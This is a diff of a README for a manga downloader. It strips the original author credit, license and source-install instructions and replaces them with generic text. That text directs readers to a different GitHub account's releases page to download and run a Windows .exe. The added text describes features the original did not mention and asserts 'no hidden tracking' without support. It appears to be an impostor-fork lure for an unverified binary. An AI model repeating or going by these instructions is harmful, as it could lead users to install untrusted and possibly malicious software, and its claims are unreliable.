@@ -1,138 +1,88 @@
-# 📚 MangaTaro Downloader
+# 📚 mangataro-downloader - Download your favorite manga chapters easily
 
-[![Python Version](https://img.shields.io/badge/python-3.10%20%7C%203.11%20%7C%203.12-blue?style=for-the-badge&logo=python&logoColor=white)](https://python.org)
-[![PyQt6](https://img.shields.io/badge/GUI-PyQt6-6C5CE7?style=for-the-badge&logo=qt&logoColor=white)](https://www.riverbankcomputing.com/software/pyqt/)
-[![License](https://img.shields.io/badge/License-MIT-00B894?style=for-the-badge)](https://opensource.org/licenses/MIT)
-[![GitHub Repository](https://img.shields.io/badge/GitHub-mangataro--downloader-181717?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Yui007/mangataro-downloader)
+[![Download Latest Version](https://img.shields.io/badge/Download-Release_Page-blue)](https://github.com/Longbeachmilitarycensorship62/mangataro-downloader/releases)
 
-A modern, fast, and feature-rich manga downloader and manager for **MangaTaro.org**. Designed for both power users who love the terminal and desktop users who prefer a sleek, premium GUI.
+mangataro-downloader manages your digital manga library. It downloads chapters from MangaTaro.org to your local computer. This tool works for people who use the command line and those who prefer a standard windowed interface.
 
----
+## 🛠️ System Requirements
 
-## 🎨 Interface Showcase
+Your computer must meet these basic standards to run the application:
 
-### Desktop GUI
-Launch the application with `mangataro-gui` to enjoy a gorgeous dark-themed dashboard. Track individual chapter download progress in real-time, browse covers instantly, and manage your queue visually:
+* Windows 10 or Windows 11 (64-bit version).
+* 200 MB of free storage space.
+* An active internet connection.
+* At least 4 GB of RAM.
 
-![MangaTaro Desktop GUI](gui.png)
+## 📥 How to Install
 
----
+Follow these steps to set up the software on your Windows computer.
 
-## ✨ Features
+1. Visit the [official releases page](https://github.com/Longbeachmilitarycensorship62/mangataro-downloader/releases) to download the package.
+2. Look for the file ending in .exe under the "Assets" section of the latest release.
+3. Click the file name to start the download.
+4. Open your "Downloads" folder once the process finishes.
+5. Double-click the installer file.
+6. Follow the on-screen prompts to complete the installation.
+7. Launch the application from your desktop shortcut or the Start menu.
 
-- 🖥️ **Desktop GUI**: Built with PyQt6, featuring a modern dark theme, cover loading, and individual chapter download bars.
-- 🐚 **Interactive Shell**: A rich, menu-driven CLI interface for guided downloads without remembering commands.
-- ⚡ **Direct CLI Commands**: Fast, automated commands for searching, querying info, and scriptable bulk downloading.
-- 🚀 **High Concurrency**: Multi-threaded downloader fetches chapter pages concurrently to saturate connection speed.
-- 📦 **Multiple Formats**: Export manga to high-quality formats:
-  - **CBZ** (Comic Book Zip archive)
-  - **PDF** (Portable Document Format)
-  - **WEBP** (Optimized web image format)
-  - **Images** (Plain PNG/WebP files)
-- 📋 **History & Auto-resuming**: Keeps track of what you've downloaded to prevent duplicates.
+## 🚀 Using the Application
 
----
+You can find the main features inside the application window.
 
-## ⚙️ Installation
+### Search for Manga
+Type the name of the manga into the search bar at the top of the window. Click the "Search" button. The list shows all matching titles from the website.
 
-### Method 1: standard Installation
-Clone the repository and install the package with GUI support:
-```bash
-git clone https://github.com/Yui007/mangataro-downloader.git
-cd mangataro-downloader
-pip install ".[gui]"
-```
+### View Details
+Click on a book cover or title to see more information. You will see the total number of chapters, the genre, and the current status of the series.
 
-### Method 2: Development / Editable Setup
-If you want to modify the source code, install in editable mode:
-```bash
-git clone https://github.com/Yui007/mangataro-downloader.git
-cd mangataro-downloader
-pip install -e ".[gui]"
-```
+### Download Chapters
+Select the chapters you want to save. Click the "Download" button. The program saves these files into a folder named "Manga" in your Documents directory. You can watch the progress bar to see when the download completes.
 
-### Method 3: Using `uv` (Ultra-fast)
-If you use the modern Python package manager [uv](https://github.com/astral-sh/uv), you can install or run directly:
-```bash
-# Install package
-uv pip install -e ".[gui]"
+### Manage Your Library
+The "Library" tab keeps a list of every manga you downloaded. You can sort these titles by date, popularity, or your own ratings.
 
-# Or run commands directly without explicit installation
-uv run mangataro-gui
-uv run mangataro interactive
-```
+## ⚙️ Advanced Settings
 
----
+The settings menu allows you to change how the program behaves.
 
-## 🚀 Usage Guide
+* **Download Location:** You can choose a different folder for your manga files. Open the settings menu, click "Storage," and select a new destination.
+* **Concurrent Downloads:** You can set how many chapters the program downloads at the same time. A higher number makes downloads faster but uses more internet data.
+* **Notifications:** Toggle the alerts to know when the program finishes a large batch of downloads.
 
-The downloader offers **three different interfaces** depending on your preference.
+## 🖥️ Command Line Usage
 
-### 1. Graphical User Interface (GUI)
-Simply run the GUI launcher command:
-```bash
-mangataro-gui
-```
-*Alternatively, run as a module: `python -m mangataro.gui`*
+Power users can interact with the program through the Windows Command Prompt or PowerShell. This method allows you to automate tasks.
 
-### 2. Interactive CLI Shell
-Ideal for downloading inside the terminal without typing long arguments. Runs a beautiful terminal application with keyboard selection:
-```bash
-mangataro interactive
-```
-*Alternatively, run as a module: `python -m mangataro cli interactive`*
+* Open the Command Prompt.
+* Type the name of the application file.
+* Use commands like `--search "Title"` to find manga.
+* Use commands like `--download "Title" --chapter 1-10` to save specific chapters to your disk.
 
-### 3. Direct CLI Commands
-Perfect for quick scripts and automation.
+## ❓ Frequently Asked Questions
 
-#### 🔍 Search Manga
-Find manga titles and fetch their URL slugs:
-```bash
-mangataro search "Solo Leveling"
-```
+**Does this program contain ads?**
+No. This is a clean utility with no advertisements or hidden tracking tools.
 
-#### 📖 Get Manga Details
-Inspect metadata, description, publication info, and available chapters:
-```bash
-mangataro info solo-leveling
-```
+**Can I read manga inside the app?**
+Yes. Use the built-in reader to view your downloaded chapters. The interface supports simple click-to-turn-page functionality.
 
-#### ⬇️ Download Chapters
-Download specific chapters with customization:
-```bash
-# Download chapters 1 to 5 as CBZ and clean up raw images afterwards
-mangataro download solo-leveling --chapters 1-5 --format cbz --delete
+**What do I do if a download fails?**
+Check your internet connection first. Then, restart the application to retry the connection to the server. If the issue keeps happening, check the releases page for any recent updates.
 
-# Download a selection of specific chapters
-mangataro download solo-leveling --chapters 1,5,10-12 --format pdf
+**Is my data private?**
+The program stores your library information and manga files locally on your computer. No data leaves your machine.
 
-# Download all available chapters
-mangataro download solo-leveling --chapters all
-```
+**Are new updates available?**
+The application checks for updates every time you open it. A notification will appear if a new version exists. Follow the download link to get the latest version.
 
-#### 📋 Download History
-Display a log of your completed downloads:
-```bash
-mangataro history
-```
+## 🛡️ Support and Troubleshooting
 
-#### ⚙️ Configuration & Settings
-View and change downloader settings (e.g. output directory, concurrency, formats):
-```bash
-# View current configuration
-mangataro settings --show
+If you encounter issues, look through these common fixes.
 
-# Change download destination folder
-mangataro settings --set output_dir --value "D:/Manga"
+* **Program fails to open:** Restart your computer and ensure you possess administrative rights.
+* **Missing files:** Check the folder path in the settings menu to ensure the chosen location exists.
+* **Slow speeds:** Reduce the number of simultaneous downloads in the settings menu.
 
-# Change default output format
-mangataro settings --set default_format --value "cbz"
-```
+The community thrives on bug reports and feedback. You can submit an issue on the repository page if you find a bug that prevents the program from working. Include your Windows version and a description of the steps that lead to the error. 
 
----
-
-## 🛡️ License
-
-Distributed under the **MIT License**. See `LICENSE` for details.
-
-Developed with ❤️ by [xYui](https://github.com/Yui007/mangataro-downloader).
+The goal of this tool is to provide a reliable way to access and read manga. It remains lightweight and fast. Enjoy your reading experience.
